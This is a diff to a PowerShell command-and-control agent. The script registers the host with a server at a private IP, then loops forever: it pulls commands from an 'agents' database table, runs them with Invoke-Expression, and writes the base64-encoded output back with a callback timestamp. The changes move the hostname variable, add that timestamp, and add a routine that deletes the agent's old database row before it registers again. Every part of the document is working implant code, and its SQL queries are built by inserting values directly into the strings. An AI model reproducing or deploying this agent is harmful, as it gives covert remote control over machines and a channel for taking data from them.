@@ -1,5 +1,5 @@
-$url = "192.168.1.102:5000"
-
+$url = "192.168.1.101:5000"
+$current_user = hostname
 
 function Get-ODBCData{  
     param(
@@ -20,9 +20,9 @@ function Get-ODBCData{
     $ds.Tables[0]
 }
 
+
 function Register-Command{
 
-$current_user = hostname
 $dataTable = Get-ODBCData -query "SELECT * FROM agents"
 $hostnames = $dataTable.hostname
 foreach($host_name in $hostnames){
@@ -31,16 +31,20 @@ foreach($host_name in $hostnames){
         break
     }
 }
-$cmd = $query.command
 
-$result = Invoke-Expression $cmd
+$cmd = $query.command
+$result = Invoke-Expression $cmd 
+
 
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($result)
 $base64Data = [Convert]::ToBase64String($bytes)
 
+$currentDate = Get-Date
+$currentTime = $currentDate.ToString('yyyy-MM-dd HH:mm:ss')
+
 foreach($host_name in $hostnames){
     if($host_name -eq $current_user){
-        $query = Get-ODBCData -query "UPDATE agents SET result='$base64Data' WHERE hostname = '$host_name'"
+        $query = Get-ODBCData -query "UPDATE agents SET result='$base64Data',last_callback = '$currentTime'  WHERE hostname = '$host_name'"
         break
     }
 }
@@ -48,6 +52,15 @@ foreach($host_name in $hostnames){
 }
 
 
+function Update-Agent{
+$dataTable = Get-ODBCData -query "SELECT * FROM agents"
+$hostnames = $dataTable.hostname
+foreach($host_name in $hostnames){
+    if($host_name -eq $current_user.ToLower()){
+        $query = Get-ODBCData -query "DELETE FROM agents WHERE hostname = '$host_name'"
+    }
+}
+}
 
 function Register-Agent {
     param (
@@ -74,18 +87,23 @@ function Register-Agent {
         Write-Output "Response Content: $($response.Content)"
     } catch {
         Write-Warning "Error: $($_.Exception.Message)"
+    
     }
     
 }
 
+# Function that deletes agent if that agent already exists in the database
+Update-Agent
 
-# Infinite loop to keep fetching and executing commands
+
+# Register Agent
 $hostname = hostname
 $proc_id = $PID
 $process_name = (Get-Process -Id $PID).ProcessName
 $architecture = if ([Environment]::Is64BitProcess) { "x64" } else { "x86" }
 Register-Agent -hostname $hostname -proc_id $proc_id -process_name $process_name -architecture $architecture
 
-while($true){
+
+while ($true){
 Register-Command
 }
